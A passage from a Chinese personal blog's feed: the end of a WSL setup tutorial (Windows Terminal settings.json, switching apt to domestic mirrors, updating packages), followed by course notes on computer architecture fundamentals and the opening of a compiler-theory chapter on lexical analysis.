class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This file was initially generated by Windows Terminal 1.4.3243.0</span></span><br><span class="line"><span class="comment">// It should still be usable in newer versions, but newer versions might have additional</span></span><br><span class="line"><span class="comment">// settings, help text, or changes that you will not see unless you clear this file</span></span><br><span class="line"><span class="comment">// and let us generate a new one for you.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// To view the default settings, hold &quot;alt&quot; while clicking on the &quot;Settings&quot; button.</span></span><br><span class="line"><span class="comment">// For documentation on these settings, see: https://aka.ms/terminal-documentation</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;$schema&quot;</span>: <span class="string">&quot;https://aka.ms/terminal-profiles-schema&quot;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;defaultProfile&quot;</span>: <span class="string">&quot;&#123;58ad8b0c-3ef8-5f4d-bc6f-13e4c00f2530&#125;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;initialRows&quot;</span>: <span class="number">25</span>,</span><br><span class="line">  <span class="attr">&quot;initialCols&quot;</span>: <span class="number">90</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// You can add more global application settings here.</span></span><br><span class="line">  <span class="comment">// To learn more about global settings, visit https://aka.ms/terminal-global-settings</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// If enabled, selections are automatically copied to your clipboard.</span></span><br><span class="line">  <span class="attr">&quot;copyOnSelect&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If enabled, formatted data is also copied to your clipboard</span></span><br><span class="line">  <span class="attr">&quot;copyFormatting&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// A profile specifies a command to execute paired with information about how it should look and feel.</span></span><br><span class="line">  <span class="comment">// Each one of them will appear in the &#x27;New Tab&#x27; dropdown,</span></span><br><span class="line">  <span class="comment">//   and can be invoked from the commandline with `wt.exe -p xxx`</span></span><br><span class="line">  <span class="comment">// To learn more about profiles, visit https://aka.ms/terminal-profile-settings</span></span><br><span class="line">  <span class="attr">&quot;profiles&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;defaults&quot;</span>: &#123;</span><br><span class="line">      <span class="comment">// Put settings here that you want to apply to all profiles.</span></span><br><span class="line">      <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;acrylicOpacity&quot;</span>: <span class="number">0.75</span>,</span><br><span class="line">      <span class="attr">&quot;useAcrylic&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;colorScheme&quot;</span>: <span class="string">&quot;Campbell&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;fontFace&quot;</span>: <span class="string">&quot;Consolas&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;fontSize&quot;</span>: <span class="number">11</span>,</span><br><span class="line">      <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#00FF00&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;cursorHeight&quot;</span>: <span class="number">25</span>,</span><br><span class="line">      <span class="attr">&quot;cursorShape&quot;</span>: <span class="string">&quot;vintage&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;snapOnInput&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;padding&quot;</span>: <span class="string">&quot;0, 0, 0, 0&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;closeOnExit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;list&quot;</span>: [</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;58ad8b0c-3ef8-5f4d-bc6f-13e4c00f2530&#125;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Debian&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;Windows.Terminal.Wsl&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;startingDirectory&quot;</span>: <span class="string">&quot;//wsl$/Debian/home/tom/&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// Make changes here to the cmd.exe profile.</span></span><br><span class="line">        <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Command Prompt&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;commandline&quot;</span>: <span class="string">&quot;cmd.exe&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hidden&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hidden&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Azure Cloud Shell&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;Windows.Terminal.Azure&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// Make changes here to the powershell.exe profile.</span></span><br><span class="line">        <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Windows PowerShell&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;commandline&quot;</span>: <span class="string">&quot;powershell.exe&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add custom color schemes to this array.</span></span><br><span class="line">  <span class="comment">// To learn more about color schemes, visit https://aka.ms/terminal-color-schemes</span></span><br><span class="line">  <span class="attr">&quot;schemes&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Campbell&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#A7B191&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#0C0C0C&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;colors&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;#0C0C0C&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#C50F1F&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#13A10E&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#C19C00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#0037DA&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#881798&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#3A96DD&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#CCCCCC&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#767676&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#E74856&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#16C60C&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#F9F1A5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#3B78FF&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#B4009E&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#61D6D6&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#F2F2F2&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Solarized Dark&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#FDF6E3&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;colors&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#D30102&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#859900&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#B58900&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#268BD2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#D33682&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#2AA198&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#EEE8D5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#002B36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#CB4B16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#586E75&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#657B83&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#839496&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#6C71C4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#93A1A1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#FDF6E3&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Solarized Light&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#FDF6E3&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;colors&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#D30102&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#859900&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#B58900&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#268BD2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#D33682&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#2AA198&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#EEE8D5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#002B36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#CB4B16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#586E75&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#657B83&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#839496&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#6C71C4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#93A1A1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#FDF6E3&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add custom actions and keybindings to this array.</span></span><br><span class="line">  <span class="comment">// To unbind a key combination from your defaults.json, set the command to &quot;unbound&quot;.</span></span><br><span class="line">  <span class="comment">// To learn more about actions and keybindings, visit https://aka.ms/terminal-keybindings</span></span><br><span class="line">  <span class="attr">&quot;actions&quot;</span>: [</span><br><span class="line">    <span class="comment">// Copy and paste are bound to Ctrl+Shift+C and Ctrl+Shift+V in your defaults.json.</span></span><br><span class="line">    <span class="comment">// These two lines additionally bind them to Ctrl+C and Ctrl+V.</span></span><br><span class="line">    <span class="comment">// To learn more about selection, visit https://aka.ms/terminal-selection</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;copy&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;singleLine&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+c&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;paste&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+v&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Press Ctrl+Shift+F to open the search box</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;find&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+shift+f&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Press Alt+Shift+D to open a new pane.</span></span><br><span class="line">    <span class="comment">// - &quot;split&quot;: &quot;auto&quot; makes this pane open in the direction that provides the most surface area.</span></span><br><span class="line">    <span class="comment">// - &quot;splitMode&quot;: &quot;duplicate&quot; makes the new pane use the focused pane&#x27;s profile.</span></span><br><span class="line">    <span class="comment">// To learn more about panes, visit https://aka.ms/terminal-panes</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;splitPane&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;split&quot;</span>: <span class="string">&quot;auto&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;splitMode&quot;</span>: <span class="string">&quot;duplicate&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;alt+shift+d&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>更改配置的几个地方（不要直接复制粘贴，一些值不同）<ul><li>更改<code>defaultProfile</code>，后面的值就粘贴<code>list</code>里面的几个项的<code>guid</code>，这是默认启动打开哪个命令行，我设置的是Debian的</li><li><code>initialRows</code>和<code>initialCols</code>设置打开后初始宽高</li><li><code>profiles</code>中的<code>defaults</code>是全局设置，可以对照更改。<code>list</code>里面就是Terminal管理的几个命令行软件，有刚装的debian，cmd，Powershell等</li><li>我在<code>list</code>里<code>Debian</code>的设置中加了<code>&quot;startingDirectory&quot;:&quot;//wsl$/Debian/home/tom/&quot;</code>，这是默认打开Debian后的目录，tom是我的用户名，大家可以改成自己的</li><li><code>schemes</code>中的配置是主题的一些配置，大家可以直接复制粘贴过去添加上</li><li><code>actions</code>中是快捷键的配置，大家自行参考</li></ul></li></ol><p>恭喜，至此Terminal配置完毕，我用的也是老师给的配置，觉得挺简约还挺好看的，一些其他更花里胡哨的配置请自行网上冲浪</p><h2 id="配置wsl"><a class="markdownIt-Anchor" href="#配置wsl"></a> 配置wsl</h2><p>言归正传，接下来我们可以使用terminal打开debian，可以在那个加号后面的向下的小箭头里面选择打开的命令行</p><h3 id="换源"><a class="markdownIt-Anchor" href="#换源"></a> 换源</h3><p>因为debian使用apt作为包管理器，而apt的默认服务器在国外，网速很慢，我们可以换到国内的镜像源来</p><ol><li><p>使用<code>su</code>切换到root权限</p></li><li><p>输入<code>cd /etc/apt</code>切换到对应目录</p></li><li><p>输入<code>cp /etc/apt/sources.list /etc/apt/sources.list_backup</code>备份一下源文件，出错的话便于还原</p></li><li><p>输入<code>nano sources.list</code>利用nano打开<code>sources.list</code>文件</p><blockquote><p>如果你会使用其他文本编辑器也是一样的<br />实在不会用的话也可以用记事本，wsl的根目录在windows的<code>C:\Users\Admin\AppData\Local\Packages\TheDebianProject.DebianGNULinux_76v4gfsz19hv4\LocalState\rootfs</code>下，其中用户名和装的Linux有出入，大家对照自己的就行<br />用记事本打开并做下面更改，保存即可</p></blockquote></li><li><p>删除所有内容，将以下内容复制粘贴进去**(命令行中复制和粘贴都是右键)**</p><p>debian源：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 中科大源</span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span></span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br></pre></td></tr></table></figure><p>Ubuntu源：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#  阿里源</span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br></pre></td></tr></table></figure></li><li><p><code>ctrl+x</code>退出，输入<code>y</code>再点<code>enter</code>确定修改</p></li><li><p>换源完成</p></li></ol><h2 id="更新包"><a class="markdownIt-Anchor" href="#更新包"></a> 更新包</h2><ol><li><code>sudo apt update</code>会将新的包下载下来</li><li><code>sudo apt upgrade</code>会升级为最新的包，两条命令顺序不要反了</li><li>以后安装软件就可以<code>sudo apt install 软件名</code>了，嘻嘻，快捷方便</li></ol><h2 id="完成"><a class="markdownIt-Anchor" href="#完成"></a> 完成</h2><p>恭喜你，你的wsl已经搞定啦，享受Linux带来的快乐吧！</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;之前上过一个Linux的选修课，了解了Linux系统的一些知识，越用越觉得一些需要命令行的软件用Linux来简直太方便了，这篇文章就介绍以下如何在windows系统上搭建Linux子系统（也就是wsl）（Windows Subsystem for Linux），这样就不用使用VMware来装虚拟机了&lt;/p&gt;</summary>
    
    
    
    <category term="wsl" scheme="https://wsw8.online/categories/wsl/"/>
    
    
    <category term="自学" scheme="https://wsw8.online/tags/%E8%87%AA%E5%AD%A6/"/>
    
    <category term="Linux" scheme="https://wsw8.online/tags/Linux/"/>
    
    <category term="wsl" scheme="https://wsw8.online/tags/wsl/"/>
    
  </entry>
  
  <entry>
    <title>系统结构第一章_量化设计与分析基础</title>
    <link href="https://wsw8.online/archives/6f1a4250.html"/>
    <id>https://wsw8.online/archives/6f1a4250.html</id>
    <published>2021-05-02T02:14:01.000Z</published>
    <updated>2021-05-10T08:31:05.691Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-计算机的分类"><a class="markdownIt-Anchor" href="#1-计算机的分类"></a> 1. 计算机的分类</h2><h3 id="11-flynns分类"><a class="markdownIt-Anchor" href="#11-flynns分类"></a> 1.1 Flynn’s分类</h3><p>定义：基于指令流和数据流数量的计算机结构分类</p><ol><li><p>SISD</p><p>串行计算机、确定执行<br />在任一时钟周期只有单个指令流在CPU执行<br />在任一时钟周期只有单个数据流用作输入</p></li><li><p>SIMD</p><p>数据级并行、适用于处理高度规整操作的问题，如图像处理、同步和确定执行<br />在任一时钟周期，所有处理单元执行相同的指令<br />每个处理单元能对不同数据元素进行操作</p><span id="more"></span></li><li><p>MISD</p><p>少有<br />单个数据流进入多个处理单元<br />每个处理单元用单个数据流对数据进行独立操作</p></li><li><p>MIMD</p><p>线程级或任务级并行、可同步或异步、可确定或非确定<br />每个处理器可以执行不同的指令流<br />每个处理器可以对不同数据流进行操作</p></li></ol><h3 id="12-市场分类"><a class="markdownIt-Anchor" href="#12-市场分类"></a> 1.2 市场分类</h3><ol><li>个人移动设备</li><li>桌面计算机</li><li>服务器</li><li>集群/仓库级计算机</li><li>嵌入式计算机</li></ol><h2 id="2-系统结构定义和任务"><a class="markdownIt-Anchor" href="#2-系统结构定义和任务"></a> 2. 系统结构定义和任务</h2><h3 id="21-定义"><a class="markdownIt-Anchor" href="#21-定义"></a> 2.1 定义</h3><p>传统定义：由程序员（机器语言）看见的（计算）系统属性，即概念性结构和功能行为，以区分数据流动和控制逻辑设计的组成及物理实现</p><p>现代定义：在满足功能、性能和价格目标的条件下，设计、选择和互连硬件部件构成计算机</p><p>区分：</p><ol><li><strong>经典的计算机系统结构</strong>是机器语言程序员所看到的传统机器级所具有的属性。它确定计算机系统的软、硬件界面。</li><li><strong>计算机组成</strong>指的是计算机系统结构的逻辑实现，包括五大功能部件组成以及逻辑设计等。它着眼于机器级内各事件的排序方式与控制方式，各部件的功能以及各部件的联系。</li><li><strong>计算机实现</strong>指的是计算机组成的物理实现，包括处理机、主存等部件的物理结构，器件的集成度和速度功耗，模块、插件、底板的划分与连接，信号传输，电源、冷却及整机装配技术等。它着眼于器件技术和微组装技术，其中器件技术在实现技术中占主导作用。</li></ol><p>例题：</p><ol><li>主存容量与编址方式(按位、按字节、按字访问等)的确定属于<u>计算机系统结构</u></li><li>为达到所定性能价格比，主存速度应多快，在逻辑结构上需采用什么措施(如多体交叉存储等)属于<u>计算机组成</u></li><li>主存系统的物理实现，如存储器器件的选定、逻辑电路的设计、微组装技术的选定属于<u>计算机实现</u></li></ol><p>影响：</p><ol><li>相同的计算机系统结构的计算机可以有不同的计算机组成</li><li>相同的计算机组成可以有不同的计算机实现</li></ol><p>系列机：</p><p>​是指由一个制造商生产的具有相同的系统结构，但具有不同组成和实现的一系列不同型号的计算机</p><p>软件兼容性：</p><p>​同一个软件可以不加修改地运行于系统结构相同的各档机器上，而且运行结果一样，差别只是运行时间不同</p><p>向后兼容：</p><p>​在某一时间生产的机器上运行的目标软件能够直接运行于更晚生产的机器上</p><p>向上兼容：</p><p>​在低档机器上运行的目标软件能够直接运行于高档机器上</p><p>指令集系统结构ISA的7个重要特征：</p><ol><li>ISA的类型：现代通用寄存器结构、早期累加器结构</li><li>存储器访问：字节访问等</li><li>寻址方式</li><li>操作数类型和大小：8位字符、32位整型数</li><li>操作类型：数据传输，算术/逻辑</li><li>控制流指令：转移，子程序调用/返回</li><li>ISA编码：固定长度，可变长度</li></ol><h3 id="22-任务"><a class="markdownIt-Anchor" href="#22-任务"></a> 2.2 任务</h3><ol><li><p>考虑</p><p>摩尔定律：集成在一个计算机芯片上的元件数量每两年翻一番<br />经验法则：成本减少速度与密度增加速度成比例<br />性能趋势：带宽改进优于时延<br />经验法则：带宽增加速度与时延平方改进速度成比例</p></li><li><p>依据</p></li><li><p>量化原则</p></li></ol><h2 id="3-性能"><a class="markdownIt-Anchor" href="#3-性能"></a> 3. 性能</h2><p>SPEC率：一个测试程序在参考计算机上执行时间与被测计算机上执行时间的比值，越大说明被测计算机性能越高</p><p>Amdahl定律：采用更快执行方式后所带来的系统性能提高，与这种执行方式的使用频率或占总执行时间的比例有关</p><p>改进比例Fe：可改进部分执行时间与改进前整个任务的执行时间的比值</p><p>改进加速比Se：改进前改进部分的执行时间与改进后改进部分的执行时间的比值</p><p>改进后整个系统的加速比Sn=1/((1-Fe)+Fe/Se)</p><p>CPU<sub>time</sub> =指令数量*CPI*时钟周期</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-计算机的分类&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-计算机的分类&quot;&gt;&lt;/a&gt; 1. 计算机的分类&lt;/h2&gt;
&lt;h3 id=&quot;11-flynns分类&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#11-flynns分类&quot;&gt;&lt;/a&gt; 1.1 Flynn’s分类&lt;/h3&gt;
&lt;p&gt;定义：基于指令流和数据流数量的计算机结构分类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;SISD&lt;/p&gt;
&lt;p&gt;串行计算机、确定执行&lt;br /&gt;
在任一时钟周期只有单个指令流在CPU执行&lt;br /&gt;
在任一时钟周期只有单个数据流用作输入&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SIMD&lt;/p&gt;
&lt;p&gt;数据级并行、适用于处理高度规整操作的问题，如图像处理、同步和确定执行&lt;br /&gt;
在任一时钟周期，所有处理单元执行相同的指令&lt;br /&gt;
每个处理单元能对不同数据元素进行操作&lt;/p&gt;</summary>
    
    
    
    <category term="系统结构" scheme="https://wsw8.online/categories/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="系统结构" scheme="https://wsw8.online/tags/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>编译原理第六章</title>
    <link href="https://wsw8.online/archives/e997863b.html"/>
    <id>https://wsw8.online/archives/e997863b.html</id>
    <published>2021-04-29T00:33:04.000Z</published>
    <updated>2021-05-10T08:29:25.322Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编译原理第六章-词法分析"><a class="markdownIt-Anchor" href="#编译原理第六章-词法分析"></a> 编译原理第六章-词法分析</h1><p>词法分析：编译程序对源程序进行分析和目标程序合成，最终生成目标程序</p><p>预处理子程序（预处理器）功能：</p><ol><li>删除编辑用字符，如制表符、换页符等</li><li>删除注释</li><li>合并多个空白字符为单个空白字符</li><li>组合多个独立文件中的源程序</li><li>展开宏定义</li><li>条件编译的选择等</li></ol><span id="more"></span><blockquote><p>其中，2、3等也可以在词法分析的同时进行</p></blockquote><h2 id="1-词法分析概述"><a class="markdownIt-Anchor" href="#1-词法分析概述"></a> 1. 词法分析概述</h2><p>扫描源程序的字符串，按照词法规则，识别出单词符号作为输出；对识别过程发现的词法错误（非法的字符、不正确的常量、程序括号等）进行处理</p><p>词法分析器只执行一次：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429084145085.png" alt="image-20210429084145085" /></p><p>词法分析器执行多次：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429084219353.png" alt="image-20210429084219353" /></p><h2 id="2-词法分析器的输出形式"><a class="markdownIt-Anchor" href="#2-词法分析器的输出形式"></a> 2. 词法分析器的输出形式</h2><h3 id="21-单词的种类"><a class="markdownIt-Anchor" href="#21-单词的种类"></a> 2.1 